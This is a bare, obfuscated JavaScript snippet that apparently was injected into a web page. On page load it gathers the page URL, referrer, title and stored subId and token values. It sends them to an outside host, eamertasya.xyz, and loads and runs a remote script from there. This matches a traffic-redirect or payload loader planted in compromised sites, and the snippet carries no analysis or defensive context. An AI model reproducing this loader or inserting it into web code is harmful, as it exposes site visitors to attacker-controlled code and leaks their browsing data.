<script>
    (function() {
    var name = '_gTfNZ65vcQfnhbHL';
    if (!window._gTfNZ65vcQfnhbHL) {
        window._gTfNZ65vcQfnhbHL = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://eamertasya.xyz/jYd5QfmF',
        };
    }
    const _MZ2SyGkDKZq7fQrH = localStorage.getItem('config');
    if (typeof _MZ2SyGkDKZq7fQrH !== 'undefined' && _MZ2SyGkDKZq7fQrH !== null) {
        var _1GpSKXZx4zXqNpHx = JSON.parse(_MZ2SyGkDKZq7fQrH);
        var _JhYP3mrRg9S2mcfY = Math.round(+new Date()/1000);
        if (_1GpSKXZx4zXqNpHx.created_at + window._gTfNZ65vcQfnhbHL.ttl < _JhYP3mrRg9S2mcfY) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _tNfwMZSvXfX54Mcd = localStorage.getItem('subId');
    var _qLdySKwbfnRkRDRb = localStorage.getItem('token');
    var _xJKgVt71rsQzGL98 = '?return=js.client';
        _xJKgVt71rsQzGL98 += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _xJKgVt71rsQzGL98 += '&se_referrer=' + encodeURIComponent(document.referrer);
        _xJKgVt71rsQzGL98 += '&default_keyword=' + encodeURIComponent(document.title);
        _xJKgVt71rsQzGL98 += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _xJKgVt71rsQzGL98 += '&name=' + encodeURIComponent(name);
        _xJKgVt71rsQzGL98 += '&host=' + encodeURIComponent(window._gTfNZ65vcQfnhbHL.R_PATH);
    if (typeof _tNfwMZSvXfX54Mcd !== 'undefined' && _tNfwMZSvXfX54Mcd && window._gTfNZ65vcQfnhbHL.unique) {
        _xJKgVt71rsQzGL98 += '&sub_id=' + encodeURIComponent(_tNfwMZSvXfX54Mcd);
    }
    if (typeof _qLdySKwbfnRkRDRb !== 'undefined' && _qLdySKwbfnRkRDRb && window._gTfNZ65vcQfnhbHL.unique) {
        _xJKgVt71rsQzGL98 += '&token=' + encodeURIComponent(_qLdySKwbfnRkRDRb);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._gTfNZ65vcQfnhbHL.R_PATH + _xJKgVt71rsQzGL98;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
    </script>